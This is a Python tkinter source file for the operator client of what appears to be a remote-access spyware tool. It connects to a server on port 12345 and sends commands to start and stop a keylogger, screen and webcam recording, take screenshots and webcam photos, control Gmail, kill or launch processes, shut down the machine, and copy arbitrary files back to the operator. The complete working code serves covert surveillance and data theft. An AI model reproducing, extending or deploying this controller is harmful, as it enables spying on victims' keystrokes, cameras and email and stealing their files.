import tkinter as tk
from tkinter import scrolledtext, filedialog, messagebox
import socket
import threading
import struct
import os

DEFAULT_PORT = 12345

class NetworkClientGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Client Network Control")
        self.sock = None

        ip_frame = tk.Frame(root)
        ip_frame.pack(padx=10, pady=5)

        tk.Label(ip_frame, text="Server IP:").pack(side=tk.LEFT)
        self.ip_entry = tk.Entry(ip_frame, width=20)
        self.ip_entry.insert(0, "127.0.0.1")
        self.ip_entry.pack(side=tk.LEFT, padx=5)

        self.connect_button = tk.Button(ip_frame, text="Connect", command=self.connect_to_server)
        self.connect_button.pack(side=tk.LEFT)

        self.command_entry = tk.Entry(root, width=60)
        self.command_entry.pack(padx=10, pady=5)

        self.send_button = tk.Button(root, text="Send Command", command=self.send_command)
        self.send_button.pack(pady=5)

        self.create_buttons()

        self.output_box = scrolledtext.ScrolledText(root, width=80, height=20)
        self.output_box.pack(padx=10, pady=10)

        status_frame = tk.Frame(root)
        status_frame.pack(pady=5)

        self.keylogger_status = tk.StringVar(value="Keylogger: ❌ Off")
        self.recording_status = tk.StringVar(value="Recording: ❌ Off")
        self.webcam_status = tk.StringVar(value="Webcam: ❌ Off")


        tk.Label(status_frame, textvariable=self.keylogger_status, fg="blue", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=20)
        tk.Label(status_frame, textvariable=self.recording_status, fg="green", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=20)
        tk.Label(status_frame, textvariable=self.webcam_status, fg="purple", font=("Arial", 10, "bold")).pack(side=tk.LEFT, padx=20)


    def create_buttons(self):
        button_groups = [
            [
                ("help", lambda: self.send_predefined("help")),
                ("list_services", lambda: self.send_predefined("list_services")),
                ("list_apps", lambda: self.send_predefined("list_apps")),
                ("screenshot", lambda: self.send_predefined("screenshot")),
                ("webcam_photo", lambda: self.send_predefined("webcam_photo")),
                ("restart", lambda: self.send_predefined("restart")),
            ],
            [
                ("shutdown", lambda: self.send_predefined("shutdown")),
                ("start_keylogger", self.send_start_keylogger),
                ("stop_keylogger", self.send_stop_keylogger),
                ("start_record", self.send_start_record),
                ("stop_record", self.send_stop_record),
                ("gmail_control", lambda: self.send_predefined("gmail_control")),
            ],
            [
                ("start_webcam_record", lambda: self.send_predefined("start_webcam_record")),
                ("stop_webcam_record", lambda: self.send_predefined("stop_webcam_record")),
                ("start <name>", self.send_start),
                ("stop <name>", self.send_stop),
                ("copyfile <path>", self.send_copyfile),
                ("exit", lambda: self.send_predefined("exit")),
            ],
        ]


        for group in button_groups:
            row = tk.Frame(self.root)
            row.pack(pady=2)
            for text, command in group:
                btn = tk.Button(row, text=text, width=18, command=command)
                btn.pack(side=tk.LEFT, padx=2)

    def connect_to_server(self):
        ip = self.ip_entry.get().strip()
        if not ip:
            messagebox.showwarning("Warning", "Please enter a server IP address.")
            return
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((ip, DEFAULT_PORT))
            self.output_box.insert(tk.END, f"Connected to server at {ip}:{DEFAULT_PORT}\n")
        except Exception as e:
            self.output_box.insert(tk.END, f"Connection failed: {e}\n")
            self.sock = None

    def send_command(self):
        if not self.sock:
            self.output_box.insert(tk.END, "Not connected to server.\n")
            return
        cmd = self.command_entry.get()
        if not cmd:
            return
        try:
            self.sock.sendall(cmd.encode())
            self.output_box.insert(tk.END, f">> {cmd}\n")
            self.last_command = cmd  # Store the last command
            threading.Thread(target=self.receive_response, daemon=True).start()
        except Exception as e:
            self.output_box.insert(tk.END, f"Failed to send: {e}\n")

    def send_predefined(self, command):
        self.command_entry.delete(0, tk.END)
        self.command_entry.insert(0, command)
        self.last_command = command  # Store the last command
        self.send_command()

    def send_start(self):
        exe_name = simple_input("Enter executable name to start (e.g. notepad.exe)")
        if exe_name:
            self.send_predefined(f"start {exe_name}")


    def send_stop(self):
        name = simple_input("Enter process name to stop (e.g. notepad.exe)")
        if name:
            self.send_predefined(f"stop {name}")

    def send_copyfile(self):
        path = simple_input("Enter full file path on server")
        if path:
            self.send_predefined(f"copyfile {path}")


    def receive_file(self):
        try:
            # Receive filename length
            name_len_data = self.sock.recv(4)
            if len(name_len_data) != 4:
                return False
            name_len = struct.unpack('I', name_len_data)[0]
            
            # Receive filename
            filename_data = self.sock.recv(name_len)
            if len(filename_data) != name_len:
                return False
            filename = "received_" + filename_data.decode()
            
            # Receive file size
            file_size_data = self.sock.recv(4)
            if len(file_size_data) != 4:
                return False
            file_size = struct.unpack('I', file_size_data)[0]
            
            if file_size == 0:
                return False
            
            # Receive file content
            with open(filename, 'wb') as f:
                total_received = 0
                while total_received < file_size:
                    remaining = file_size - total_received
                    chunk_size = min(remaining, 4096)
                    chunk = self.sock.recv(chunk_size)
                    if not chunk:
                        return False
                    f.write(chunk)
                    total_received += len(chunk)
            
            self.output_box.insert(tk.END, f"File received successfully: {filename} ({file_size} bytes)\n")
            self.output_box.see(tk.END)
            return True
            
        except Exception as e:
            self.output_box.insert(tk.END, f"Error receiving file: {e}\n")
            self.output_box.see(tk.END)
            return False

    def receive_response(self):
        try:
            data = self.sock.recv(4096)
            if data:
                response = data.decode()
                self.output_box.insert(tk.END, f"{response}\n")
                self.output_box.see(tk.END)
                # Update webcam status if applicable
                if "Webcam recording started" in response:
                    self.webcam_status.set("Webcam: 🔴 Recording")
                elif "Webcam recording stopped" in response:
                    self.webcam_status.set("Webcam: ❌ Off")

                
                # Check if server is sending a file
                last_command = getattr(self, 'last_command', '')
                if (("Screenshot captured successfully" in response and last_command == "screenshot") or
                    ("Screen recording stopped" in response and last_command == "stop_record") or
                    ("Webcam photo captured successfully" in response and last_command == "webcam_photo") or
                    ("Webcam recording stopped" in response and last_command == "stop_webcam_record") or
                    ("Keylogger stopped" in response and last_command == "stop_keylogger") or
                    ("File copied successfully" in response and last_command.startswith("copyfile")) or
                    ("process_list.txt" in response and last_command == "list_services") or
                    ("list_apps.txt" in response and last_command == "list_apps")):
                    self.output_box.insert(tk.END, "Waiting to receive file from server...\n")
                    self.output_box.see(tk.END)
                    if self.receive_file():
                        self.output_box.insert(tk.END, "File transfer completed successfully.\n")
                    else:
                        self.output_box.insert(tk.END, "File transfer failed.\n")
                    self.output_box.see(tk.END)
            else:
                self.output_box.insert(tk.END, "Server closed the connection.\n")
        except Exception as e:
            self.output_box.insert(tk.END, f"Error receiving: {e}\n")

    def send_start_keylogger(self):
        self.send_predefined("start_keylogger")
        self.keylogger_status.set("Keylogger: ✅ On")

    def send_stop_keylogger(self):
        self.send_predefined("stop_keylogger")
        self.keylogger_status.set("Keylogger: ❌ Off")

    def send_start_record(self):
        self.send_predefined("start_record")
        self.recording_status.set("Recording: 🔴 Recording")

    def send_stop_record(self):
        self.send_predefined("stop_record")
        self.recording_status.set("Recording: ❌ Stopped")


def simple_input(prompt):
    input_win = tk.Toplevel()
    input_win.title("Input")
    tk.Label(input_win, text=prompt).pack(padx=10, pady=5)
    entry = tk.Entry(input_win, width=40)
    entry.pack(padx=10, pady=5)
    result = {"value": None}

    def confirm():
        result["value"] = entry.get()
        input_win.destroy()

    tk.Button(input_win, text="OK", command=confirm).pack(pady=5)
    input_win.grab_set()
    input_win.wait_window()
    return result["value"]

if __name__ == "__main__":
    root = tk.Tk()
    app = NetworkClientGUI(root)
    root.mainloop()
